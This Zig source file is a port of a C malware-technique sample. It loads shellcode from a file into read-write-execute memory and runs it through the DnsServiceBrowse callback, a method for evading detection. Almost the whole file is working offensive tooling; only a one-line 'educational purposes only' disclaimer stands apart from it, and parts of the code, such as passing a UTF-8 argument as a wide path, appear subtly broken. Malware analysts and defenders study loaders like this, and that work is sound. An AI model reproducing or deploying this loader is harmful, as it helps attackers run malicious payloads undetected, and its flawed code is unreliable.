//RE-write from C to Zig,
//Disclaimer: This code is for educational purposes only. Do not use it for illegal purposes.
//I do not own the original code, I just re-wrote it in Zig.
//Original code: https://samples.vx-underground.org/Papers/Windows/Evasion%20-%20Process%20Creation%20and%20Shellcode%20Execution/2023-01-29%20-%20Shellcode%20Execution%20via%20DnsServiceBrowse.c
const std = @import("std");
const windows = std.os.windows;

// Placeholder for Windows-specific types and functions
const BOOL = i32;
const TRUE = 1;
const FALSE = 0;
const DWORD = u32;
const PVOID = *anyopaque;
const PAGE_EXECUTE_READWRITE = 0x40;
const MEM_COMMIT = 0x1000;
const MEM_RESERVE = 0x2000;
const INFINITE = 0xFFFFFFFF;

// Placeholder for DNS_SERVICE_BROWSE_REQUEST and DNS_SERVICE_CANCEL structs
const DNS_SERVICE_BROWSE_REQUEST = struct {
    Version: u32,
    pBrowseCallback: PVOID,
    InterfaceIndex: u32,
    QueryName: [*:0]const u16,
    pQueryContext: ?*anyopaque,
};

const DNS_SERVICE_CANCEL = struct {};

// Function prototypes (you'll need to implement these)
extern "kernel32" fn VirtualAlloc(lpAddress: ?PVOID, dwSize: usize, flAllocationType: DWORD, flProtect: DWORD) ?PVOID;
extern "kernel32" fn Sleep(dwMilliseconds: DWORD) void;
extern "dnsapi" fn DnsServiceBrowse(pRequest: *DNS_SERVICE_BROWSE_REQUEST, pCancel: *DNS_SERVICE_CANCEL) DWORD;

fn ReadContents(filepath: [:0]const u16, buffer: *[]u8) !void {
    const file = try std.fs.openFileW(filepath, .{});
    defer file.close();

    const file_size = try file.getEndPos();
    buffer.* = try std.heap.page_allocator.alloc(u8, file_size);
    _ = try file.readAll(buffer.*);
}

pub fn main() !void {
    const allocator = std.heap.page_allocator;

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len != 2) {
        std.debug.print("Usage: DnsServiceBrowse.exe C:\\Path\\To\\Shellcode.bin\n", .{});
        return;
    }

    var shellcode: []u8 = undefined;
    ReadContents(args[1], &shellcode) catch |err| {
        std.debug.print("Failed to read file: {}\n", .{err});
        return;
    };
    defer allocator.free(shellcode);

    const hAlloc = VirtualAlloc(null, shellcode.len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) orelse {
        std.debug.print("VirtualAlloc failed\n", .{});
        return;
    };

    const dest_slice = @as([*]u8, @ptrCast(hAlloc))[0..shellcode.len];
    @memcpy(dest_slice, shellcode);

    var sDSBR = DNS_SERVICE_BROWSE_REQUEST{
        .Version = 1, // DNS_QUERY_REQUEST_VERSION1
        .pBrowseCallback = hAlloc,
        .InterfaceIndex = 0,
        .QueryName = std.unicode.utf8ToUtf16LeStringLiteral("localhost"),
        .pQueryContext = null,
    };

    var sDSC = DNS_SERVICE_CANCEL{};

    _ = DnsServiceBrowse(&sDSBR, &sDSC);

    Sleep(INFINITE);
}
